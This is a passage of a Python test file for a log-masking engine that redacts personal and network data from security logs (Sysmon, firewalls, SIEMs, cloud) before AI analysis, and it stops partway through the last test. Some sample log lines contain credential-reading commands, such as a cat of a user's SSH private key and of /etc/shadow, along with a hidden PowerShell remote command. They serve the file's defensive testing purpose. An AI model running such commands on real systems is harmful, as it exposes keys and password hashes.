"""Quick checks for the masking engine. Run: python test_masker.py"""

import os
import tempfile

from log_masker import masker

# The app-level tests below (analyze/chat) would otherwise write their test
# entities into the REAL entity vault — point it at a throwaway file first.
try:
    from cryptography.fernet import Fernet
    from log_masker import vault
    vault.configure(os.path.join(tempfile.mkdtemp(prefix="masker_test_"),
                                 "vault.enc"),
                    Fernet.generate_key().decode())
except ImportError:
    pass

ALL = ["identities", "network", "secrets"]


def check(name, cond):
    print(("PASS" if cond else "FAIL") + " - " + name)
    assert cond, name


def test_roundtrip():
    raw = (
        "2026-06-09 user=jsmith logged in from 10.4.2.19 to vpn.acme-corp.com\n"
        "email jane.doe@acme-corp.com token=sk-exampleexampleexample\n"
        "session 550e8400-e29b-41d4-a716-446655440000 mac 00:1A:2B:3C:4D:5E\n"
    )
    masked, mapping = masker.mask(raw, ALL)

    # Real secrets must be gone from what we send.
    check("username removed", "jsmith" not in masked)
    check("ip removed", "10.4.2.19" not in masked)
    check("domain removed", "acme-corp.com" not in masked)
    check("email removed", "jane.doe@acme-corp.com" not in masked)
    check("apikey removed", "sk-exampleexampleexample" not in masked)
    check("uuid removed", "550e8400-e29b-41d4-a716-446655440000" not in masked)
    check("mac removed", "00:1A:2B:3C:4D:5E" not in masked)

    # Placeholders present.
    check("has placeholders", "[" in masked and "]" in masked)

    # Un-masking an AI-style response restores values.
    fake_ai = "Suspicious login by [USER_1] from [IP_1] using [APIKEY_1]."
    restored = masker.unmask(fake_ai, mapping)
    check("restore user", "jsmith" in restored)
    check("restore ip", "10.4.2.19" in restored)
    check("restore apikey", "sk-exampleexampleexample" in restored)


def test_stable_placeholders():
    raw = "10.0.0.1 talked to 10.0.0.1 and 10.0.0.2"
    masked, mapping = masker.mask(raw, ["network"])
    # Same IP -> same placeholder; two distinct IPs -> two entries.
    check("two distinct IPs", len(mapping) == 2)
    ph = [k for k, v in mapping.items() if v == "10.0.0.1"][0]
    check("repeated IP uses one placeholder", masked.count(ph) == 2)


def test_category_toggle():
    raw = "user=bob from 10.0.0.1"
    masked, mapping = masker.mask(raw, ["network"])  # identities OFF
    check("user kept when identities off", "bob" in masked)
    check("ip masked when network on", "10.0.0.1" not in masked)


def test_no_false_positive_filenames():
    raw = "loaded config from app.py and server.log"
    masked, mapping = masker.mask(raw, ["network"])
    check("filenames not masked", "app.py" in masked and "server.log" in masked)


def test_ipv6_vs_timestamp():
    raw = "10:31:02 conn from 2001:db8::8a2e:370:7334 and fe80::1 ok"
    masked, mapping = masker.mask(raw, ["network"])
    check("timestamp not masked as ipv6", "10:31:02" in masked)
    check("compressed ipv6 masked", "2001:db8::8a2e:370:7334" not in masked)
    check("link-local ipv6 masked", "fe80::1" not in masked)

    full = "addr fe80:0000:0000:0000:0202:b3ff:fe1e:8329 here"
    m2, _ = masker.mask(full, ["network"])
    check("full ipv6 masked", "fe80:0000:0000:0000:0202:b3ff:fe1e:8329" not in m2)


def test_bare_hostname_param():
    # The PowerShell case the user reported: -ComputerName SRV-DB-02
    raw = ("powershell.exe -nop -w hidden -c \"Invoke-Command "
           "-ComputerName SRV-DB-02 -ScriptBlock { Get-LocalGroupMember "
           "-Group 'Administrators' }\"")
    masked, mapping = masker.mask(raw, ["network"])
    check("bare computer name masked", "SRV-DB-02" not in masked)
    check("hostname maps back", "SRV-DB-02" in mapping.values())

    raw2 = "hostname=web01 server: dc-01.corp connecting"
    m2, _ = masker.mask(raw2, ["network"])
    check("hostname= masked", "web01" not in m2)


def test_custom_terms():
    raw = "Deploy of project-falcon to SRV-DB-02 by Acme Corp ops team"
    masked, mapping = masker.mask(
        raw, [], custom_terms=["project-falcon", "Acme Corp", "SRV-DB-02"])
    check("custom term 1 masked", "project-falcon" not in masked)
    check("custom term 2 masked", "Acme Corp" not in masked)
    check("custom term 3 masked", "SRV-DB-02" not in masked)
    # case-insensitive match, restores exact matched text
    raw3 = "ACME CORP and acme corp"
    m3, map3 = masker.mask(raw3, [], custom_terms=["Acme Corp"])
    check("custom case-insensitive", "ACME CORP" not in m3 and "acme corp" not in m3)
    restored = masker.unmask(m3, map3)
    check("custom restores original casing", restored == raw3)


def test_windows_event_log():
    raw = (
        "An account was successfully logged on.\n"
        "Subject:\n"
        "\tSecurity ID:\t\tS-1-5-21-3623811015-3361044348-30300820-1013\n"
        "\tAccount Name:\t\tjsmith\n"
        "\tAccount Domain:\t\tACME\n"
        "\tLogon ID:\t\t0x3E7\n"
        "New Logon:\n"
        "\tAccount Name:\t\tWS-FINANCE-07$\n"
        "\tAccount Domain:\t\tACME.LOCAL\n"
        "Network Information:\n"
        "\tWorkstation Name:\tWS-FINANCE-07\n"
        "\tSource Network Address:\t10.20.30.40\n"
        "Subject DN: CN=John Smith,OU=Sales,DC=acme,DC=com via console\n"
        "\tAccount Name:\t\t-\n"
        "\tAccount Domain:\t\tNT AUTHORITY\n"
    )
    masked, mapping = masker.mask(raw, ALL)
    check("SID masked", "S-1-5-21-3623811015" not in masked)
    check("SID masked as one token",
          "S-1-5-21-3623811015-3361044348-30300820-1013" in mapping.values())
    check("event account name masked", "jsmith" not in masked)
    check("event account domain masked", "\tACME\n" not in masked)
    check("computer account masked", "WS-FINANCE-07$" not in masked)
    check("workstation masked", "WS-FINANCE-07\n" not in masked)
    check("source address masked", "10.20.30.40" not in masked)
    check("AD DN masked", "CN=John Smith" not in masked)
    check("AD DN masked as one token",
          "CN=John Smith,OU=Sales,DC=acme,DC=com" in mapping.values())
    check("text after DN kept", "via console" in masked)
    check("placeholder dash kept", "\tAccount Name:\t\t-" in masked)
    check("NT AUTHORITY kept", "NT AUTHORITY" in masked)
    # field labels survive so the AI still understands the structure
    check("field labels kept", "Account Name:" in masked)


def test_network_device_logs():
    raw = (
        "Jun 10 14:23:01 fw-edge-01 %ASA-6-605005: Login permitted from "
        "10.1.1.5/51122 to inside:10.1.1.1/ssh for user 'netadmin'\n"
        "date=2026-06-10 devname=\"FGT-CUST-01\" srcip=192.168.1.77 "
        "user=\"vpnuser1\" msg=\"SSL tunnel established\"\n"
        "snmp community=Pr1v@teRO host=core-sw-02\n"
        "Contact +49 170 1234567 for escalation\n"
    )
    masked, mapping = masker.mask(raw, ALL)
    check("syslog hostname masked", "fw-edge-01" not in masked)
    check("quoted cisco user masked", "netadmin" not in masked)
    check("fortigate devname masked", "FGT-CUST-01" not in masked)
    check("fortigate user masked", "vpnuser1" not in masked)
    check("snmp community masked", "Pr1v@teRO" not in masked)
    check("host key masked", "core-sw-02" not in masked)
    check("phone masked", "+49 170 1234567" not in masked)
    check("timestamp kept", "14:23:01" in masked)
    check("ASA code kept", "%ASA-6-605005" in masked)


def test_sysmon_logs():
    raw = (
        "Process Create:\n"
        "RuleName: technique_id=T1059\n"
        "UtcTime: 2026-06-10 14:23:01.123\n"
        "ProcessGuid: {a23eae89-bd56-5903-0000-0010e9d95e00}\n"
        "Image: C:\\Windows\\System32\\cmd.exe\n"
        "CommandLine: cmd.exe /c type C:\\Users\\j.doe\\notes.txt\n"
        "CurrentDirectory: C:\\Users\\j.doe\\\n"
        "User: ACME\\j.doe\n"
        "Hashes: SHA256=6E340B9CFFB37A989CA544E6BB780A2C789"
        "01D3FB33738768511A30617AFA01D\n"
        "ParentImage: C:\\Windows\\explorer.exe\n"
        "ParentUser: NT AUTHORITY\\SYSTEM\n"
        "bash -c 'cat /home/j.doe/.ssh/id_rsa'\n"
    )
    masked, mapping = masker.mask(raw, ALL)
    check("sysmon user masked", "j.doe" not in masked)
    check("sysmon domain user masked", "ACME\\j.doe" in mapping.values())
    # System paths must survive intact — they are what the AI analyzes.
    check("system32 path kept", "C:\\Windows\\System32\\cmd.exe" in masked)
    check("explorer path kept", "C:\\Windows\\explorer.exe" in masked)
    check("profile path structure kept", "C:\\Users\\[USER_" in masked)
    check("unix home masked", "/home/j.doe" not in masked)
    check("builtin NT AUTHORITY SYSTEM kept", "NT AUTHORITY\\SYSTEM" in masked)
    # Reversed deliberately: a file hash is an IOC, not customer data. Masking
    # it removed the one value an analyst (or the AI) can actually look up, and
    # it identifies a binary rather than a person. See _KEEP_PATTERNS.
    check("sysmon file hash kept, so it can still be looked up",
          "6E340B9C" in masked)
    check("sysmon field labels kept", "CommandLine:" in masked)


def test_sysmon_xml():
    raw = (
        "<Event><System><Computer>WS07.acme.local</Computer></System>"
        "<EventData><Data Name='User'>ACME\\svc_backup</Data>"
        "<Data Name='SourceHostname'>WS07</Data>"
        "<Data Name='SourceIp'>10.1.2.3</Data>"
        "<Data Name='TargetUserName'>j.doe</Data>"
        "<Data Name='TargetDomainName'>ACME</Data>"
        "<Data Name='TargetUserName'>-</Data></EventData></Event>"
    )
    masked, mapping = masker.mask(raw, ALL)
    check("xml computer masked", "WS07.acme.local" not in masked)
    check("xml bare hostname masked", ">WS07<" not in masked)
    check("xml user masked", "svc_backup" not in masked)
    check("xml target user masked", "j.doe" not in masked)
    check("xml domain masked", ">ACME<" not in masked)
    check("xml ip masked", "10.1.2.3" not in masked)
    check("xml dash placeholder kept", ">-</Data>" in masked)
    check("xml structure kept", "<Data Name='TargetUserName'>" in masked)


def test_sysmon_group():
    """The Sysmon (Windows & Linux) group: whole-value user and host fields,
    and the runtime scaffolding around them that must stay readable."""
    raw = (
        "Process Create:\n"
        "RuleName: technique_id=T1059,technique_name=Command and Scripting\n"
        "Image: C:\\Program Files\\Acme Suite\\acmeagent.exe\n"
        "User: ACMECORP\\a.karimi\n"
        "ParentUser: ACMECORP\\a.karimi\n"
        "\n"
        "=== next block ===\n"
        "Dns query:\n"
        "QueryName: dc01.acmecorp.lan\n"
        "SourceHostname: WS-FIN-114\n"
        "DestinationHostname: mail.acmecorp.lan\n"
        "SourceUser: ACMECORP\\m.olsen\n"
        "TargetUser: NT AUTHORITY\\SYSTEM\n"
    )
    masked, mapping = masker.mask(raw, ALL)
    # The whole account, not a prefix of it. A "===" separator on the next
    # line used to make the generic user pattern stop at "ACMECORP\a." and
    # send the surname in clear.
    check("sysmon user masked whole", "karimi" not in masked)
    check("sysmon user is one placeholder",
          "ACMECORP\\a.karimi" in mapping.values())
    check("sysmon parent user reuses the alias", masked.count(
        [k for k, v in mapping.items() if v == "ACMECORP\\a.karimi"][0]) == 2)
    check("sysmon source user masked", "m.olsen" not in masked)
    check("sysmon builtin target user kept", "NT AUTHORITY\\SYSTEM" in masked)
    check("sysmon dns query masked", "dc01.acmecorp.lan" not in masked)
    check("sysmon source hostname masked", "WS-FIN-114" not in masked)
    check("sysmon destination hostname masked",
          "mail.acmecorp.lan" not in masked)
    # The vendor directory names the software. The space in "Program Files"
    # is what let DOMAIN\user read "Files\Acme" as an account.
    check("program files path kept",
          "C:\\Program Files\\Acme Suite\\acmeagent.exe" in masked)
    check("attack technique name kept", "Command and Scripting" in masked)
    check("sysmon field labels kept", "QueryName:" in masked)


def test_sysmon_xml_scaffolding():
    """Forwarded Sysmon XML: the channel's own constants are not customer
    data, and the user/host fields are read from <Data Name=...>."""
    raw = (
        "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>"
        "<System><Provider Name='Microsoft-Windows-Sysmon' "
        "Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/>"
        "<Computer>WS-FIN-114.acmecorp.lan</Computer>"
        "<Security UserID='S-1-5-18'/></System><EventData>"
        "<Data Name='CommandLine'>net use \\\\FS-01\\pay$ "
        "/user:ACMECORP\\adm_backup Sup3rSecret!</Data>"
        "<Data Name='SourceUser'>ACMECORP\\m.olsen</Data>"
        "<Data Name='TargetUser'>NT AUTHORITY\\SYSTEM</Data>"
        "<Data Name='QueryName'>vpn.acmecorp.com</Data>"
        "<Data Name='Device'>\\Device\\HarddiskVolume2</Data>"
        "</EventData></Event>"
    )
    masked, mapping = masker.mask(raw, ALL)
    check("xml namespace kept", "schemas.microsoft.com" in masked)
    check("sysmon provider guid kept",
          "5770385f-c22a-43e0-bf4c-06f5698ffbd9" in masked)
    check("well-known short SID kept", "UserID='S-1-5-18'" in masked)
    check("device path kept", "\\Device\\HarddiskVolume2" in masked)
    check("xml source user masked", "m.olsen" not in masked)
    check("xml query name masked", "vpn.acmecorp.com" not in masked)
    # The password must not swallow the tag that follows it: the XML has to
    # survive masking, and the mapping must hold the password alone.
    check("net use password masked", "Sup3rSecret!" not in masked)
    check("password did not eat the markup",
          "Sup3rSecret!" in mapping.values())
    check("xml still well formed", masked.count("</Data>") == 5)


def test_sysmon_linux():
    """Sysmon for Linux: same schema, unix logins and paths."""
    raw = (
        "Jun 10 14:32:44 srv-app-07 sysmon: Network connection detected:\n"
        "Image: /usr/lib/postfix/sbin/smtp\n"
        "User: postfix\n"
        "ParentUser: o.banaei\n"
        "SourceHostname: srv-app-07.acmecorp.lan\n"
        "TargetFilename: /home/o.banaei/.config/acme/token.json\n"
        "EventNamespace: \"root\\\\cimv2\"\n"
        "Consumer: \"CommandLineEventConsumer.Name=x\"\n"
    )
    masked, mapping = masker.mask(raw, ALL)
    check("linux sysmon user masked", "o.banaei" not in masked)
    check("linux home path structure kept", "/home/[USER_" in masked)
    check("linux sysmon hostname masked",
          "srv-app-07.acmecorp.lan" not in masked)
    # A daemon account ships with the distribution and identifies nobody --
    # masking it also shredded the binary path it appears in.
    check("daemon account kept", "User: postfix" in masked)
    check("daemon path kept", "/usr/lib/postfix/sbin/smtp" in masked)
    check("wmi namespace kept", "root\\\\cimv2" in masked)
    check("wmi consumer class kept", "CommandLineEventConsumer.Name" in masked)


def test_sysmon_patterns_earn_their_place():
    """Each Sysmon pattern is pinned by a value the generic key=value rules
    cannot reach: a non-ASCII personal name (their value class is ASCII-only)
    and a single-label DNS query (no dot, so the FQDN pattern cannot see it).
    Without these the group would be untested scenery."""
    raw = (
        "User: ACMECORP\\J\u00f6rg M\u00fcller\n"
        "QueryName: internal-dc01\n"
        "<Data Name='TargetUser'>ACME\\J\u00f6rg M\u00fcller</Data>\n"
        "<Data Name='QueryName'>internal-dc02</Data>\n"
        '"SourceUser": "ACME\\\\J\u00f6rg M\u00fcller"\n'
        '"QueryName": "internal-dc03"\n'
    )
    masked, _ = masker.mask(raw, ALL)
    check("non-ascii name masked (render)", "J\u00f6rg M\u00fcller" not in masked)
    check("single-label dns query masked (render)",
          "internal-dc01" not in masked)
    check("single-label dns query masked (xml)", "internal-dc02" not in masked)
    check("single-label dns query masked (json)", "internal-dc03" not in masked)


def test_windows_path_is_not_an_account():
    """A space inside a Windows path let DOMAIN\\user start half way through
    it. Two independent vetoes cover the two halves: a directory word on the
    left, a file name on the right."""
    raw = (
        "Image: C:\\Program Files\\Acme Suite\\acmeagent.exe\n"
        "ParentImage: C:\\Users\\a.karimi\\My Documents\\Acme Tools\\run.exe\n"
    )
    masked, _ = masker.mask(raw, ALL)
    check("directory word on the left is not a domain",
          "Program Files\\Acme" in masked)
    check("file name on the right is not an account",
          "Suite\\acmeagent.exe" in masked)
    check("spaced profile path kept but the profile name masked",
          "My Documents\\Acme Tools\\run.exe" in masked
          and "a.karimi" not in masked)


def test_sysmon_group_is_in_the_library():
    sources = {p["source"] for p in masker.get_builtin_patterns()}
    check("sysmon group listed", "Sysmon (Windows & Linux)" in sources)
    ids = {p["id"] for p in masker.get_builtin_patterns()
           if p["source"] == "Sysmon (Windows & Linux)"}
    check("sysmon group has its patterns", len(ids) == 7)
    check("sysmon ids are stable", "sysmon-user" in ids)


def test_qradar_logs():
    raw = (
        "LEEF:2.0|IBM|QRadar|2.0|AuthFail|usrName=j.doe\tsrc=10.20.30.40\t"
        "dst=172.16.5.10\tidentHostName=ws07.acme.local\n"
        '{"id": 4821, "description": "Multiple Login Failures", '
        '"offense_source": "j.doe", "assigned_to": "soc1@acme.com"}\n'
        "Event Name: Authentication Failure\n"
        "Log Source: WinCollect @ dc01.acme.local\n"
        "Username: j.doe\n"
        "Source IP: 10.20.30.40\n"
    )
    masked, mapping = masker.mask(raw, ALL)
    check("leef usrName masked", "j.doe" not in masked)
    check("leef src masked", "10.20.30.40" not in masked)
    check("leef identHostName masked", "ws07.acme.local" not in masked)
    check("offense_source masked as user", '"offense_source": "[USER_' in masked)
    check("offense email masked", "soc1@acme.com" not in masked)
    check("qradar log source host masked", "dc01.acme.local" not in masked)
    check("leef header kept", "LEEF:2.0|IBM|QRadar|2.0|AuthFail" in masked)
    check("event name kept", "Authentication Failure" in masked)
    # The same user must read consistently across LEEF, JSON and event text.
    user_ph = [k for k, v in mapping.items() if v == "j.doe"]
    check("one placeholder for same user", len(user_ph) == 1)
    check("user placeholder used 3x", masked.count(user_ph[0]) == 3)


def test_linux_os_logs():
    raw = (
        "Jun 10 14:23:01 srv-web-01 sshd[1234]: Failed password for "
        "invalid user admin from 203.0.113.5 port 51122 ssh2\n"
        "Jun 10 14:23:05 srv-web-01 sshd[1234]: Accepted publickey for "
        "j.smith from 10.1.2.3 port 51123 ssh2: RSA SHA256:tH9Qx\n"
        "Jun 10 14:24:00 srv-web-01 sudo: j.smith : TTY=pts/0 ; "
        "PWD=/home/j.smith ; USER=root ; COMMAND=/bin/cat /etc/shadow\n"
        "Jun 10 14:25:00 srv-web-01 su[2345]: pam_unix(su:session): "
        "session opened for user root by j.smith(uid=1000)\n"
    )
    masked, mapping = masker.mask(raw, ALL)
    check("sshd user masked", "j.smith" not in masked)
    check("sshd invalid user masked", "user admin from" not in masked)
    check("sshd host masked", "srv-web-01" not in masked)
    check("linux root kept", "user root" in masked and "USER=root" in masked)
    check("sudo PWD path structure kept", "PWD=/home/[USER_" in masked)
    check("uid number kept", "uid=1000" in masked)
    check("linux command kept", "COMMAND=/bin/cat /etc/shadow" in masked)


def test_cloud_json_logs():
    raw = (
        '{"operationName":"Sign-in activity","properties":{'
        '"userPrincipalName":"j.smith@acme.com",'
        '"userDisplayName":"John Smith","ipAddress":"203.0.113.5",'
        '"appDisplayName":"Office 365",'
        '"deviceDetail":{"displayName":"WS07"}}}\n'
        '{"AccountName":"j.smith","AccountDomain":"acme",'
        '"DeviceName":"ws07.acme.local","Title":"Suspicious process",'
        '"compromisedEntity":"vm-prod-01","password":"hunter2"}\n'
    )
    masked, mapping = masker.mask(raw, ALL)
    check("entra upn masked", "j.smith@acme.com" not in masked)
    check("entra display name masked", "John Smith" not in masked)
    check("entra device display name masked", "WS07" not in masked)
    check("entra app name kept", '"appDisplayName":"Office 365"' in masked)
    check("defender account masked", '"AccountName":"[USER_' in masked)
    check("defender domain masked", '"AccountDomain":"[DOMAIN_' in masked)
    check("defender device masked", "ws07.acme.local" not in masked)
    check("defender compromised entity masked", "vm-prod-01" not in masked)
    check("json password masked", "hunter2" not in masked)
    check("alert title kept", "Suspicious process" in masked)


def test_appliance_logs():
    raw = (
        "1581094030.464317986 MX84_Branch ip_flow_start src=192.168.1.5 "
        "dst=8.8.8.8 protocol=udp sport=5353 dport=53\n"
        "1581094031 AP-Floor2 events type=association "
        "client_mac='58:40:4E:AB:3D:4E' identity='j.smith'\n"
        "<134> 06/10/2026:14:23:01 GMT ns01 0-PPE-0 : default SSLVPN LOGIN "
        ": Context j.smith@203.0.113.5 - User j.smith - Client_ip 203.0.113.5\n"
        "Jun 10 14:23:01 cp-gw-01 fw: accept rule: 42; src: 10.1.2.3; "
        "user: j.smith;\n"
        "Jun 10 14:23:01 pa-fw-01 1,2026/06/10,TRAFFIC,end,10.1.2.3,8.8.8.8,"
        "rule1,acme\\j.smith,,web-browsing\n"
        'device_name="XG310" user_name="j.smith" src_ip=10.1.2.3\n'
        "Jun 10 14:23:01 bigip01.acme.local notice apd[1234]: 01490010:5: "
        "Username 'j.smith'\n"
    )
    masked, mapping = masker.mask(raw, ALL)
    check("meraki device masked", "MX84_Branch" not in masked)
    check("meraki ap masked", "AP-Floor2" not in masked)
    check("appliance user masked everywhere", "j.smith" not in masked)
    check("paloalto domain user masked", "acme\\j.smith" in mapping.values())
    check("sophos device masked", "XG310" not in masked)
    check("meraki event type kept", "ip_flow_start" in masked)
    check("checkpoint verdict kept", "accept rule: 42" in masked)


def test_vmware_and_proxy_logs():
    raw = (
        "2026-06-10T14:23:01.123Z esx01 Hostd: Event 123 : User "
        "j.smith@10.1.2.3 logged in as VMware vim-java\n"
        "2026-06-10T14:24:01.123Z vc01.acme.local vpxd: "
        "[vim.event.UserLoginSessionEvent] User ACME.LOCAL\\j.smith logged in\n"
        "opened \\\\fs01-prod\\finance\\report.xlsx\n"
        "203.0.113.5 - j.smith [10/Jun/2026:14:23:01 +0200] \"GET /profile "
        "HTTP/1.1\" 200 1234 \"https://app.acme.com/\"\n"
        "2026-06-10T14:25:01Z INFO Starting service\n"
    )
    masked, mapping = masker.mask(raw, ALL)
    check("esxi bare host masked", "esx01" not in masked)
    check("esxi user masked", "j.smith" not in masked)
    check("vcenter dotted domain user masked",
          "ACME.LOCAL\\j.smith" in mapping.values())
    check("unc server masked", "fs01-prod" not in masked)
    check("unc share path kept", "\\finance\\report.xlsx" in masked)
    check("proxy authuser masked", "[USER_" in masked.split("[10/Jun")[0])
    check("log level not masked as host", "INFO Starting service" in masked)


def test_endpoint_security_logs():
    # Symantec EP (space-separated keys), Trend Micro CEF, McAfee ePO XML.
    raw = (
        "Jun 10 14:23:01 sepm01 SymantecServer: Virus found,IP Address: "
        "10.1.2.3,Computer name: WS-FIN-07,Risk name: EICAR Test String,"
        "C:\\Users\\j.smith\\Downloads\\eicar.com,User name: j.smith,"
        "Domain name: ACME\n"
        "<134>Jun 10 14:23:01 dsm01 CEF:0|Trend Micro|Deep Security|20.0|600|"
        "User Signed In|3|src=10.1.2.3 suser=j.smith target=j.smith\n"
        "<EPOEvent><MachineInfo><MachineName>WS07</MachineName>"
        "<UserName>ACME\\j.smith</UserName></MachineInfo>"
        "<ThreatName>EICAR</ThreatName></EPOEvent>\n"
    )
    masked, mapping = masker.mask(raw, ALL)
    check("sep computer name masked", "WS-FIN-07" not in masked)
    check("sep user name masked", "j.smith" not in masked)
    check("sep domain name masked", "Domain name: [DOMAIN_" in masked)
    check("sep verdict kept", "Virus found" in masked)
    check("sep risk name kept", "EICAR Test String" in masked)
    check("trend target masked as user", "target=[USER_" in masked)
    check("epo machine masked", "<MachineName>[HOST_" in masked)
    check("epo user masked", "ACME\\j.smith" in mapping.values())
    check("epo threat kept", "<ThreatName>EICAR</ThreatName>" in masked)


def test_network_security_logs():
    # SonicWALL, Linux dhcpd, QRadar SIM Audit, Cisco AMP JSON.
    raw = (
        "Jun 10 14:23:01 sw01 id=firewall sn=18B169AB12CD fw=203.0.113.1 "
        'msg="Connection Opened" src=10.1.2.3:51122:X0 usr="j.smith"\n'
        "Jun 10 14:23:01 dhcp01 dhcpd: DHCPACK on 10.1.2.55 to "
        "58:40:4e:ab:3d:4e (WS-FIN-07) via eth0\n"
        "Jun 10 14:23:01 qradar01 [SIM Audit] j.smith@10.1.1.100 (1234) - "
        "User j.smith logged in from 10.1.1.100\n"
        '{"computer":{"hostname":"WS07","user":"j.smith@WS07"}}\n'
    )
    masked, mapping = masker.mask(raw, ALL)
    check("sonicwall serial masked", "18B169AB12CD" not in masked)
    check("sonicwall usr masked", "j.smith" not in masked)
    check("dhcpd hostname masked", "WS-FIN-07" not in masked)
    check("dhcpd interface kept", "via eth0" in masked)
    user_ph = [k for k, v in mapping.items() if v == "j.smith"]
    check("same user one placeholder", len(user_ph) == 1)
    check("sim audit user@ip masked", user_ph[0] + "@[IP_" in masked)
    check("amp user@host one token", "j.smith@WS07" in mapping.values())


def test_azure_firewall_and_fp():
    raw = (
        '{"category":"AzureFirewallApplicationRule","resourceId":'
        '"/SUBSCRIPTIONS/9a8b7c6d-1234-5678-9abc-def012345678/RESOURCEGROUPS/'
        'RG-PROD/PROVIDERS/MICROSOFT.NETWORK/AZUREFIREWALLS/FW-PROD-01",'
        '"properties":{"msg":"HTTPS request from 10.1.2.3:51122 to '
        'app.acme-corp.com:443. Action: Allow"}}\n'
        '{"source":"ACME\\\\j.smith","location":'
        '"C:\\\\Users\\\\j.smith\\\\eicar.com","dhost":"WS07"}\n'
        "server listening on localhost:8080 target=https://api.example.org/\n"
    )
    masked, mapping = masker.mask(raw, ALL)
    check("azure resource id masked as one token", '"resourceId":"[RESOURCE_1]"' in masked)
    check("azure rg not leaked", "RG-PROD" not in masked)
    check("json-escaped domain user masked", "ACME\\\\j.smith" in mapping.values())
    check("json-escaped profile path masked", "j.smith" not in masked)
    check("json path Users kept", "C:\\\\Users\\\\[USER_" in masked)
    check("localhost port kept", "localhost:8080" in masked)
    check("target=https kept", "target=https://" in masked)


def test_dns_mail_infra_logs():
    # ISC BIND, Solaris sendmail, Barracuda WAF, ExtremeWare, Keeper.
    raw = (
        "10-Jun-2026 14:23:01.123 queries: info: client 203.0.113.5#51122 "
        "(mail.acme-corp.com): query: mail.acme-corp.com IN A +E(0)\n"
        "Jun 10 14:23:01 sol01 sendmail[1234]: q5AEN1xyz: "
        "from=<sender@acme-corp.com>, msgid=<202606@mail.acme-corp.com>\n"
        "Jun 10 14:23:01 xtr01 06/10/2026 <Info:SYST> User j.smith "
        "logged in from 10.1.2.3 (telnet)\n"
        '{"audit_event":"login","username":"k.lee@acme-corp.com",'
        '"remote_address":"203.0.113.7"}\n'
    )
    masked, mapping = masker.mask(raw, ALL)
    check("bind query domain masked", "mail.acme-corp.com" not in masked)
    check("bind record type kept", "IN A +E(0)" in masked)
    check("sendmail sender masked", "sender@acme-corp.com" not in masked)
    check("sendmail queue id kept", "q5AEN1xyz" in masked)
    check("extremeware user masked", "j.smith" not in masked)
    check("keeper username masked", "k.lee@acme-corp.com" not in masked)
    check("keeper event kept", '"audit_event":"login"' in masked)


def test_wazuh_logs():
    raw = (
        '{"rule":{"level":10,"description":"Multiple authentication failures",'
        '"id":"5720"},"agent":{"id":"012","name":"web01-prod","ip":"10.1.2.3"},'
        '"manager":{"name":"wazuh-mgr01"},"data":{"srcip":"203.0.113.5",'
        '"srcuser":"jsmith","dstuser":"root"},"full_log":"Jun 10 14:23:01 '
        'web01-prod sshd[1234]: Failed password for jsmith from 203.0.113.5"}\n'
        "Jun 10 14:23:01 wazuh-mgr01 wazuh: Alert 1591094030.12: - syscheck, "
        "2026 Jun 10 14:23:01 (web02-prod) 10.1.2.5->syscheck Integrity "
        "checksum changed for: '/etc/passwd'\n"
        'Jun 10 14:23:02 wazuh-mgr01 wazuh: Agent: "web02-prod" reconnected\n'
        'GET / HTTP/1.1 User-Agent: "Mozilla/5.0 (Macintosh)"\n'
    )
    masked, mapping = masker.mask(raw, ALL)
    check("wazuh agent name masked", "web01-prod" not in masked)
    check("wazuh manager name masked", "wazuh-mgr01" not in masked)
    check("wazuh srcuser masked", "jsmith" not in masked)
    check("wazuh dstuser root kept", '"dstuser":"root"' in masked)
    check("wazuh rule description kept",
          "Multiple authentication failures" in masked)
    check("wazuh syslog alert agent masked", "web02-prod" not in masked)
    check("wazuh checked file kept", "'/etc/passwd'" in masked)
    check("user-agent header kept", 'User-Agent: "Mozilla/5.0' in masked)
    # agent name in JSON and inside full_log must share one placeholder
    host_ph = [k for k, v in mapping.items() if v == "web01-prod"]
    check("wazuh one placeholder per agent", len(host_ph) == 1)
    check("wazuh full_log host masked too", masked.count(host_ph[0]) == 2)


def test_squid_and_watchguard_logs():
    raw = (
        "1581094030.123    245 10.1.2.3 TCP_MISS/200 4521 GET "
        "http://files.acme-corp.com/report.zip jsmith DIRECT/203.0.113.99 "
        "application/zip\n"
        "1581094031.456     12 10.1.2.4 TCP_DENIED/403 3821 CONNECT "
        "badsite.example.net:443 - HIER_NONE/- text/html\n"
        "<142>Jun 10 14:23:01 FW-HQ-01 80BE052F336C0 (2026-06-10T14:23:01) "
        'firewall: msg_id="3000-0148" Allow 1-Trusted 0-External tcp '
        "10.1.2.3 203.0.113.99 51122 443 (HTTP-proxy-00)\n"
    )
    masked, mapping = masker.mask(raw, ALL)
    check("squid username masked", "jsmith" not in masked)
    check("squid username labeled user", "jsmith" ==
          [v for k, v in mapping.items() if k.startswith("[USER")][0])
    check("squid cache verdict kept", "TCP_MISS/200" in masked)
    check("squid dash ident kept", " - HIER_NONE/- " in masked)
    check("watchguard serial masked", "80BE052F336C0" not in masked)
    check("watchguard hostname masked", "FW-HQ-01" not in masked)
    check("watchguard msg_id kept", 'msg_id="3000-0148"' in masked)


def test_qradar_offense_csv():
    raw = (
        "id,magnitude,closeUser,offenseSource,description,attacker,target,"
        "userCount,assignedToUser,username,attackerNetwork,attackerIP,"
        "domainName,deviceOrderBy,formattedCreatedTime\n"
        '4821,7,m.brown,j.smith,"Multiple Login Failures for j.smith",'
        "10.20.30.40,172.16.5.10,1,soc.analyst1,j.smith,Net-10-172-192,"
        '203.0.113.5,ACME,WS-FIN-07,"Jun 10, 2026 14:23"\n'
        "4822,3,-,WS-FIN-07,Port scan detected,198.51.100.7,10.0.0.5,0,"
        'soc.analyst1,N/A,Net-Guest,198.51.100.7,ACME,sw-core-01,'
        '"Jun 11, 2026 09:00"\n'
    )
    masked, mapping = masker.mask(raw, ALL)
    for leak in ("j.smith", "m.brown", "soc.analyst1", "Net-10-172-192",
                 "Net-Guest", "WS-FIN-07", "sw-core-01"):
        check(f"csv {leak} masked", leak not in masked)
    check("csv bare domain masked", ",ACME," not in masked)
    check("csv header row kept", raw.split("\n")[0] in masked)
    check("csv counts kept", ",7," in masked and ",1," in masked)
    check("csv dates kept", "Jun 10, 2026 14:23" in masked)
    check("csv placeholder dash kept", ",-," in masked)
    check("csv N/A kept", ",N/A," in masked)
    check("csv free text kept", "Multiple Login Failures for" in masked
          and "Port scan detected" in masked)
    check("csv ip labeled IP", "203.0.113.5" in
          [v for k, v in mapping.items() if k.startswith("[IP")])
    # Same value -> same placeholder across columns AND inside descriptions.
    ph = [k for k, v in mapping.items() if v == "j.smith"]
